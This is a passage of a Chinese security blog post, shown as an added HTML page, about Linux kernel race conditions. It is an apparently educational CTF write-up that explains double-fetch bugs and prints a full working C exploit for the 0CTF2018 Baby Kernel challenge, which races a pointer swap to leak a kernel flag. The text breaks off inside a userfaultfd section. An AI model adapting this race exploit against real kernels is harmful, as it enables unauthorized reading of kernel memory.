@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Linux Kernel 条件竞争 | 南行&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Double Fetch简介
+Double Fetch 从漏洞原理上来说，是一种内核态与用户态之间的条件竞争。
+在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能代码通常情况下，用户空间向内核传递数据时，内核先通过通过copy_from_user等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/linux/race/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.06b120a65aeb9368e0ceaf40b7f104e3773d33d49b58d97f1c5e76995fbc7718.css" integrity="sha256-BrEgplrrk2jgzq9At/EE43c9M9SbWNl/HF52mV&#43;8dxg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="apple-touch-icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="mask-icon" href="http://localhost:1313/assets/favicon.jpg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/posts/linux/race/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><script type="text/javascript"
+        async
+        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$'], ['\[\[','\]\]']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+});
+
+MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+</script>
+
+<style>
+code.has-jax {
+    font: inherit;
+    font-size: 100%;
+    background: inherit;
+    border: inherit;
+    color: #515151;
+}
+</style>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="南行&#39;s Blog (Alt + H)">南行&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="南行&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Linux Kernel 条件竞争
+    </h1>
+    <div class="post-meta"><span title='2025-12-02 09:30:38 +0000 UTC'>2025年12月2日</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul><ul><ul>
+                    <li>
+                        <a href="#double-fetch%e7%ae%80%e4%bb%8b" aria-label="Double Fetch简介">Double Fetch简介</a></li>
+                    <li>
+                        <a href="#%e4%be%8b%e9%a2%98-0ctf2018-baby-kernel" aria-label="例题 0CTF2018 Baby Kernel">例题 0CTF2018 Baby Kernel</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%88%86%e6%9e%90" aria-label="分析">分析</a></li>
+                    <li>
+                        <a href="#%e6%80%9d%e8%b7%af" aria-label="思路">思路</a></li></ul>
+                    </li></ul>
+                        </ul>
+                        
+                    <li>
+                        <a href="#userfaultfd" aria-label="userfaultfd">userfaultfd</a><ul>
+                            
+                    <li>
+                        <a href="#%e7%b3%bb%e7%bb%9f%e8%b0%83%e7%94%a8" aria-label="系统调用">系统调用</a></li>
+                    <li>
+                        <a href="#%e4%bb%85%e6%8e%a8%e8%bf%9b%e7%8a%b6%e6%80%81" aria-label="仅推进状态">仅推进状态</a></li>
+                    <li>
+                        <a href="#%e6%b3%a8%e5%86%8c" aria-label="注册">注册</a></li>
+                    <li>
+                        <a href="#%e5%a4%84%e7%90%86%e9%a1%b5%e9%94%99%e8%af%af" aria-label="处理页错误">处理页错误</a></li>
+                    <li>
+                        <a href="#%e5%9c%a8%e7%94%a8%e6%88%b7%e6%80%81%e6%89%a7%e8%a1%8c%e4%bd%a0%e7%9a%84%e6%93%8d%e4%bd%9c" aria-label="在用户态执行你的操作">在用户态执行你的操作</a></li>
+                    <li>
+                        <a href="#%e7%bc%93%e8%a7%a3%e6%8e%aa%e6%96%bd" aria-label="缓解措施">缓解措施</a></li>
+                    <li>
+                        <a href="#%e4%be%8b%e9%a2%98-qwb2021-notebook" aria-label="例题 QWB2021-notebook">例题 QWB2021-notebook</a><ul>
+                            
+                    <li>
+                        <a href="#%e5%88%86%e6%9e%90-1" aria-label="分析">分析</a></li>
+                    <li>
+                        <a href="#%e6%80%9d%e8%b7%af-1" aria-label="思路">思路</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                    </li>
+                </ul>
+                </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+  <div class="post-content"><h3 id="double-fetch简介">Double Fetch简介<a hidden class="anchor" aria-hidden="true" href="#double-fetch简介">#</a></h3>
+<p>Double Fetch 从漏洞原理上来说，是一种内核态与用户态之间的条件竞争。</p>
+<p>在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能代码通常情况下，用户空间向内核传递数据时，内核先通过通过<code>copy_from_user</code>等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。</p>
+<p>一个典型的 Double Fetch 漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次调用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。</p>
+<p><img decoding="async" loading="lazy" src="/assets/Pasted%20image%2020250609075758.png" style="max-width: 100%; height: auto;"></p>
+<h3 id="例题-0ctf2018-baby-kernel">例题 0CTF2018 Baby Kernel<a hidden class="anchor" aria-hidden="true" href="#例题-0ctf2018-baby-kernel">#</a></h3>
+<h4 id="分析">分析<a hidden class="anchor" aria-hidden="true" href="#分析">#</a></h4>
+<p>分析启动脚本发现内核没有开启任何保护。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">qemu-system-x86_64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-m 256M -smp 2,cores<span class="o">=</span>2,threads<span class="o">=</span><span class="m">1</span>  <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-kernel ./vmlinuz-4.15.0-22-generic <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-initrd  ./core.cpio <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-append <span class="s2">&#34;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-cpu qemu64 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-netdev user,id<span class="o">=</span>t0, -device e1000,netdev<span class="o">=</span>t0,id<span class="o">=</span>nic0 <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>-nographic  -enable-kvm  <span class="se">\
+</span></span></span></code></pre></div><p>查看内核 init</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">mount -t proc none /proc
+</span></span><span class="line"><span class="cl">mount -t sysfs none /sys
+</span></span><span class="line"><span class="cl">mount -t devtmpfs devtmpfs /dev
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;flag{this_is_a_sample_flag}&#34;</span> &gt; flag
+</span></span><span class="line"><span class="cl">chown root:root flag
+</span></span><span class="line"><span class="cl">chmod <span class="m">400</span> flag
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 0&lt;/dev/console
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 1&gt;/dev/console
+</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 2&gt;/dev/console
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">insmod baby.ko
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> /dev/baby
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;\nBoot took </span><span class="k">$(</span>cut -d<span class="s1">&#39; &#39;</span> -f1 /proc/uptime<span class="k">)</span><span class="s2"> seconds\n&#34;</span>
+</span></span><span class="line"><span class="cl">setsid cttyhack setuidgid <span class="m">1000</span> sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">umount /proc
+</span></span><span class="line"><span class="cl">umount /sys
+</span></span><span class="line"><span class="cl">poweroff -d <span class="m">0</span>  -f
+</span></span></code></pre></div><p>解包文件系统：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mkdir core <span class="o">&amp;&amp;</span> <span class="nb">cd</span> core
+</span></span><span class="line"><span class="cl">cp ../core.cpio .
+</span></span><span class="line"><span class="cl">cpio -idmv &lt; core.cpio
+</span></span></code></pre></div><p>逆向分析 baby.ko</p>
+<p>分析代码发现如果 a2 为 0x6666 就会打印出 flag 的地址，如果 a2 为 0x1337 就会将我们传入的 flag 和真正的 flag 做比较。</p>
+<img src="/assets/image-20250902075431889.png" alt="image-20250902075431889" style="zoom:50%;" />
+<p>根据 <code>Double Fetch</code> 漏洞原理，发现此题目存在一个 <code>Double Fetch</code> 漏洞，当用户输入数据通过验证后，再将 <code>flag_str</code> 所指向的地址改为 flag 硬编码地址后，即会输出 flag 内容。</p>
+<h4 id="思路">思路<a hidden class="anchor" aria-hidden="true" href="#思路">#</a></h4>
+<p>首先，利用提供的 <code>cmd=0x6666</code> 功能，获取内核中 flag 的加载地址。</p>
+<blockquote>
+<p>内核中以 <code>printk</code> 输出的内容，可以通过 <code>dmesg</code> 命令查看。</p>
+</blockquote>
+<p>然后，构造符合 <code>cmd=0x1337</code> 功能的数据结构，其中 <code>flag_len</code> 可以从硬编码中直接获取为 33， <code>flag_str</code> 指向一个用户空间地址。</p>
+<p>最后，创建一个恶意线程，不断的将 <code>flag_str</code> 所指向的用户态地址修改为 flag 的内核地址以制造竞争条件，从而使其通过驱动中的逐字节比较检查，输出 flag 内容。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./start.sh 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">./exp
+</span></span></code></pre></div><blockquote>
+<p><code>exp.c</code> 中碰撞次数为0x1000，若不成功，可尝试将 <code>TRYTIME</code> 增大，或多试几次。</p>
+</blockquote>
+<ul>
+<li>exp</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">pthread_t</span> <span class="n">compete_thread</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="n">real_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">competetion_times</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">status</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> 
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">flag_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">flag_len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">flag</span> <span class="o">=</span> <span class="p">{.</span><span class="n">flag_addr</span> <span class="o">=</span> <span class="n">buf</span><span class="p">,</span> <span class="p">.</span><span class="n">flag_len</span> <span class="o">=</span> <span class="mi">33</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">competetionThread</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">status</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">competetion_times</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="p">.</span><span class="n">flag_addr</span> <span class="o">=</span> <span class="n">real_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">result_fd</span><span class="p">,</span> <span class="n">addr_fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">temp</span><span class="p">,</span> <span class="o">*</span><span class="n">flag_addr_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/baby&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6666</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;dmesg | grep flag &gt; addr&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">temp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">addr_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;./addr&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">temp</span><span class="p">[</span><span class="nf">read</span><span class="p">(</span><span class="n">addr_fd</span><span class="p">,</span> <span class="n">temp</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 获取 &#34;Your flag is at XXXXX&#34; 中的地址部分
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">flag_addr_addr</span> <span class="o">=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="s">&#34;Your flag is at &#34;</span><span class="p">)</span> <span class="o">+</span> <span class="nf">strlen</span><span class="p">(</span><span class="s">&#34;Your flag is at &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">real_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="nf">strtoull</span><span class="p">(</span><span class="n">flag_addr_addr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">compete_thread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">competetionThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">status</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">competetion_times</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="p">.</span><span class="n">flag_addr</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1337</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;dmesg | grep flag &gt; result&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">result_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;./result&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">read</span><span class="p">(</span><span class="n">result_fd</span><span class="p">,</span> <span class="n">temp</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">strstr</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="s">&#34;flag{&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">pthread_cancel</span><span class="p">(</span><span class="n">compete_thread</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] competetion end!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;dmesg | grep flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>编译和运行：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gcc -static exp.c -lpthread -o exp
+</span></span><span class="line"><span class="cl">touch addr result
+</span></span></code></pre></div><p>cat flag 成功：</p>
+<p><img decoding="async" loading="lazy" src="/assets/image-20251117220924278.png" style="max-width: 100%; height: auto;"></p>
+<h1 id="userfaultfd">userfaultfd<a hidden class="anchor" aria-hidden="true" href="#userfaultfd">#</a></h1>
+<h2 id="系统调用">系统调用<a hidden class="anchor" aria-hidden="true" href="#系统调用">#</a></h2>
+<p><code>userfaultfd</code> 系统调用的处理函数定义在 <code>fs/userfaultfd.c</code> 中。glibc 并没有封装这个系统调用的包装函数，所以你必须直接调用 <code>syscall</code>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">SYSCALL_DEFINE1</span><span class="p">(</span><span class="n">userfaultfd</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="n">flags</span><span class="p">)</span>
+</span></span></code></pre></div><p>它只是从 <code>userfaultfd_ctx_cachep</code> 分配一个 <code>struct userfaultfd_ctx</code> 缓存，然后创建一个名为 <code>[userfaultfd]</code> 的匿名 inode，并返回它的文件描述符给用户态。<code>userfaultfd_ctx</code> 存储在文件的 <code>private_data</code> 中。文件的 <code>file_operations</code> 被分配为 <code>userfaultfd_fops</code>。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">userfaultfd_fops</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#ifdef CONFIG_PROC_FS
